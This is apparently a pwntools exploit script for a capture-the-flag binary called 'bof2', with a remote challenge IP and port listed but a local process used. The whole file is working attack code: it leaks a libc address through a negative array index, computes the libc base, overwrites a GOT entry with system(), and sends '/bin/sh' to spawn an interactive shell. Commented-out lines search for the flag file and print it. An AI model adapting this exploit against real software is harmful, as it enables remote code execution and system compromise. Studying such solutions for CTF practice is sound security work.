from pwn import *
import base64
import binascii

host = "124.244.16.209"
port = 8002
#libc = ELF('libc.so.6')
#/lib/x86_64-linux-gnu/libc-2.24.so

libc = ELF('libc-2.24.so')

#r = remote(host,port)

r=process('./bof2')

#sleep(20)

def dump(i):

	r.recvuntil('Input:\n')
	r.sendline('1')

	r.recvuntil(']:\n')

	send=i*-1
	send/=8
	r.sendline(str(send))


	addr=r.recvuntil('\n')[:-1]

	#print addr

	stri='0x'

	for i in range(len(addr)-1,-1,-1):
		temp=hex(ord(addr[i]))

		#print temp
		checker=int(temp,16)
		offset=''
		if(checker<0x10):
			offset+='0'


		temp=str(temp)

		temp=temp.split('x',1)
		
		stri+=offset
		stri+=temp[1]

		#print hex(ord(addr[i]))

	#print 'address of position '+str(send)+' '+stri
	dec=int(stri,16)
	hx=hex(dec)

	#print dec

	return hx




write_c=dump(32)

write_c=long(write_c,16)

#.data:0000000000601060 message1
#putchar:0000000000601018 off_601018   -72 putchar
#exit 00601048 -24
#scanf 0000000000601040 -32
#off_601030      dq offset strchr
#write 0000000000601020 -64
#libc main 600FF0 -14

one_time=0x04647c
print write_c

execc=0x0B8A7F


libc_base=write_c-libc.symbols["scanf"]
#exit as main
#sys=0x4006db

sys=libc_base+libc.symbols["system"]

#sys=libc_base+execc

r.recvuntil('Input:\n')
r.sendline('2')
r.recvuntil(']:\n')
r.sendline('-6')
r.recvuntil(']:\n')
r.sendline(p64(sys)[:7])

r.recvuntil('Input:\n')
r.sendline('2')
r.recvuntil(']:\n')
r.sendline('0')
r.recvuntil(']:\n')
payload='/bin/sh\x00'
r.sendline(payload)

#payload='find / -name flag'

#r.sendline(payload)

#payload='cat /home/bof2/flag'

#r.sendline(payload)
r.interactive()
